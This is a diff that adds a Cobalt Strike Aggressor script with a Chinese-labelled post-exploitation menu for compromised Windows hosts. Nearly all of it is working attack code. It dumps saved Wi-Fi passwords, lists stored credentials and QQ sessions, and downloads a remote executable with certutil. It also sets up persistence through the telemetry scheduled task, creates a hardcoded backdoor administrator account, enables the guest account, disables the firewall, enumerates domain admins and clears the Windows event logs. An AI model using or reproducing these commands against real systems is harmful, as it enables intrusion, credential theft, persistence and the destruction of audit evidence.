@@ -1,0 +1,125 @@
+popup beacon_bottom {
+	menu "键盘已扣" {
+
+				item "获取登录的QQ" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "dir \\\\.\\pipe\\\\ | findstr \"QQ_\" | findstr \"_pipe\"");
+			}
+		}
+				item "获取连接过的wifi" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "netsh wlan show profiles");
+			}
+		}
+			    item "获取wifi密码" {
+             prompt_text("wifi名?", "", lambda({
+            bshell(@ids, "netsh wlan show profile name=\"$1\" key=clear");
+        }, @ids => $1));
+    }		
+	
+			    item "远程下载exe" {
+             prompt_text("远程文件地址?默认下载到c:\windows目录", "", lambda({
+            bshell(@ids, "Certutil.exe -urlcache -split -f $1 C:\\windows\\helper.exe");
+        }, @ids => $1));
+    }	
+	
+			    item "\"遥测\"计划任务" {
+             prompt_text("文件路径", "", lambda({
+            bshell(@ids, "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\Microsoft\" /v Command /t reg_sz /d $1");
+			bshell(@ids, "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\Microsoft\" /v Nightly /t reg_dword /d 1");
+			bshell(@ids, "schtasks /run /tn \"\\Microsoft\\Windows\\Application Experience\\Microsoft Compatibility Appraiser\"");
+        }, @ids => $1));
+    }		
+				item "查看SMB指向路径" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "wmic share get name,path");
+			}
+		}
+				item "查看安装程序和版本信息" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "wmic product list brief");
+			}
+		}
+				item "查看安装的补丁" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "wmic qfe  get hotfixid");
+			}
+		}
+				item "查看进程详细" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "wmic process get caption,commandline,processid /value");
+			}
+		}
+				item "查看服务" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "net start");
+			}
+		}
+		
+				item "查看域管" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "net group \"domain admins\" /domain");
+			}
+		}
+				item "建立用户并加入管理员组" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "net user admin123 admin@123 /add");
+				bshell($1, "net localgroup administrators admin123 /add");
+			}
+		}
+				item "激活guest用户" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "net user guest /active:yes");
+			}
+		}
+				item "systeminfo" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "systeminfo");
+			}
+		}
+				item "mstsc记录" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "cmdkey /list");
+			}
+		}
+				item "枚举当前域" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "net view /domain");
+			}
+		}
+			    item "枚举域上主机列表" {
+             prompt_text("domain?", "", lambda({
+            bshell(@ids, "net view /DOMAIN:$1");
+        }, @ids => $1));
+    }
+				item "关闭防火墙" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "netsh advfirewall set allprofiles state off");
+			}
+		}
+			    item "清除系统日志" {
+             prompt_text("确定清除?", "请详细阅读网络安全法", lambda({
+            bshell(@ids, "wevtutil cl security");
+			bshell(@ids, "wevtutil cl system");
+			bshell(@ids, "wevtutil cl application");
+        }, @ids => $1));
+    }	
+
+		
+			
+	}
+}
